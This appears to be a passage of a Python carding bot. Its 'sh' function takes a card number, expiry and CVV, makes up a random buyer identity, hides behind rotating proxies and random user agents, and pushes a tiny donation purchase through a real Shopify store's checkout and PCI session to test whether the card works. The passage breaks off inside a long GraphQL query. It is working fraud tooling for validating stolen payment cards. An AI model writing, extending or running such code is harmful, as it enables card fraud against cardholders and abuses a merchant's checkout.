# --- END CAPTCHA SOLVER PLACEHOLDER ---

# --- MODIFIED SH FUNCTION ---

def sh(card_details, username, proxy_to_use=None):
    start_time = time.time()
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm_raw = match.group(2)
    mm = str(int(mm_raw))
    yy_raw = match.group(3)
    cvc = match.group(4)

    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return "Invalid year format."

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"

    # Enhanced anonymity: Random email, names, address
    ua = UserAgent()
    user_agent = ua.random
    gen_email = lambda: f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"
    remail = gen_email()
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    random_addr = get_random_address()
    addr1 = random_addr["address1"]
    addr2 = random_addr["address2"]
    city = random_addr["city"]
    country_code = random_addr["countryCode"]
    postal = random_addr["postalCode"]
    zone = random_addr["zoneCode"]
    # Use random last name for address to vary
    addr_last = random.choice(last_names).lower()

    # New session for each check
    session = requests.Session()
    
    # --- MODIFICATION ---
    # Use the proxy passed into the function
    proxy = proxy_to_use
    if proxy:
        session.proxies.update(proxy)
        print(f"Using proxy: {proxy['http']}")
    # --- END MODIFICATION ---

    # Step 1: Add to cart
    print("Step 1: Adding to cart...")
    url = "https://wagsterdogtreats.com/cart/add"
    headers = {
        'authority': 'wagsterdogtreats.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://wagsterdogtreats.com',
        'referer': 'https://wagsterdogtreats.com/collections/donations/products/donation?variant=40496997859509',
        'user-agent': user_agent,
    }
    data = {
        'form_type': 'product',
        'utf8': '✓',
        'id': '42238394204242',
        'quantity': '1',
        'options[Donation]': '0.10',
        'quantity': '5',
    }
    # MODIFICATION: Removed explicit proxy=, session handles it
    response = session.post(url, headers=headers, data=data)
    random_delay(0.2, 0.5)  # Minimal delay
    if response.status_code != 200:
        return f"Failed at step 1: Add to cart. Status: {response.status_code}"
    
    # Step 2: Get cart token
    print("Step 2: Fetching cart...")
    headers = {
        'authority': 'wagsterdogtreats.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://wagsterdogtreats.com/products/donations',
        'user-agent': user_agent,
    }
    # MODIFICATION: Removed explicit proxy=, session handles it
    response = session.get('https://wagsterdogtreats.com/cart.js', headers=headers)
    raw = response.text
    random_delay(0.2, 0.5)
    try:
        res_json = json.loads(raw)
        tok = res_json['token']
    except json.JSONDecodeError:
        return "Failed at step 2: Could not decode cart JSON"
    
    # Step 3: Post to cart page for tokens (with retry mechanism)
    print("Step 3: Posting to cart page...")
    step3_headers = {
        'authority': 'wagsterdogtreats.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://wagsterdogtreats.com',
        'referer': 'https://wagsterdogtreats.com/cart',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user_agent,
    }
    step3_data = {
        'updates[]': '1',
        'checkout': 'Check out',
    }
    
    # RETRY MECHANISM for step 3 token extraction
    MAX_STEP3_RETRIES = 3
    x = None
    queue_token = None
    stableid = None
    paymentmethodidentifier = None
    
    for step3_attempt in range(MAX_STEP3_RETRIES):
        try:
            print(f"Step 3: Attempt {step3_attempt + 1}/{MAX_STEP3_RETRIES}")
            response = session.post(
                'https://wagsterdogtreats.com/cart',
                headers=step3_headers,
                data=step3_data,
                allow_redirects=True,
                timeout=30
            )
            text = response.text
            x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
            stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
            paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            
            if all([x, queue_token, stableid, paymentmethodidentifier]):
                print(f"Step 3: Successfully extracted tokens on attempt {step3_attempt + 1}")
                break
            else:
                print(f"Step 3: Token extraction failed on attempt {step3_attempt + 1}, missing tokens")
                if step3_attempt < MAX_STEP3_RETRIES - 1:
                    retry_delay = random.uniform(1.0, 2.5) * (step3_attempt + 1)  # Exponential backoff
                    print(f"Step 3: Retrying in {retry_delay:.2f}s...")
                    time.sleep(retry_delay)
        except requests.exceptions.RequestException as e:
            print(f"Step 3: Request error on attempt {step3_attempt + 1}: {e}")
            if step3_attempt < MAX_STEP3_RETRIES - 1:
                retry_delay = random.uniform(1.5, 3.0) * (step3_attempt + 1)
                print(f"Step 3: Retrying in {retry_delay:.2f}s...")
                time.sleep(retry_delay)
    
    if not all([x, queue_token, stableid, paymentmethodidentifier]):
        return "Failed at step 3: Could not extract required tokens from cart page after retries."

    random_delay(0.3, 0.7)  # Minimal delay

    # Step 4: PCI session
    print("Step 4: Creating PCI session...")
    headers = {
        'authority': 'checkout.pci.shopifyinc.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://checkout.pci.shopifyinc.com',
        'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': user_agent,
    }
    json_data = {
        'credit_card': {
            'number': cc,
            'month': mm,
            'year': yy,
            'verification_value': cvc,
            'start_month': None,
            'start_year': None,
            'issue_number': '',
            'name': f'{rfirst} {rlast}',
        },
        'payment_session_scope': 'wagsterdogtreats.com',
    }
    # MODIFICATION: Removed explicit proxy=, session handles it
    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
    random_delay(0.2, 0.5)
    try:
        sid = response.json()['id']
        print(f"PCI Session ID: {sid}")
    except (json.JSONDecodeError, KeyError):
        print(f"PCI Response: {response.text[:200]}")
        return "Failed at step 4: Could not get payment session ID"

    random_delay(0.3, 0.7)  # Minimal delay

    # Step 5: Submit for completion
    print("Step 5: Submitting for completion...")
    headers = {
        'authority': 'wagsterdogtreats.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://wagsterdogtreats.com',
        'referer': 'https://wagsterdogtreats.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'SubmitForCompletion',
    }
    # Use random address in submission for anonymity
    json_data = {
    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}completedRemoteCheckouts{...CompletedRemoteCheckouts __typename}consolidatedTotals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}consolidatedTaxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}consolidatedProposedSubtotalBeforeTaxesAndShipping{amount currencyCode __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}...on FailedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}...on BankPaymentInstrument{bankName lastDigits paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment CompletedRemoteCheckouts on CompletedRemoteCheckout{...on SubmittedRemoteCheckout{shopId checkoutSessionToken processedRemoteReceipt:remoteReceipt{id orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{groupType availableOn deliveryStrategy{handle title methodType __typename}lineAmount{amount currencyCode __typename}targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productTitle digest requiresShipping __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}...on FailedRemoteCheckout{shopId checkoutSessionToken recoveryUrl negotiatedProposal{merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{title subtitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}__typename}...on ContextualizedProductVariantMerchandise{title subtitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}__typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}failedRemoteReceipt:remoteReceipt{remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}...on CartMetafieldDeleteOperation{key namespace appId __typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount 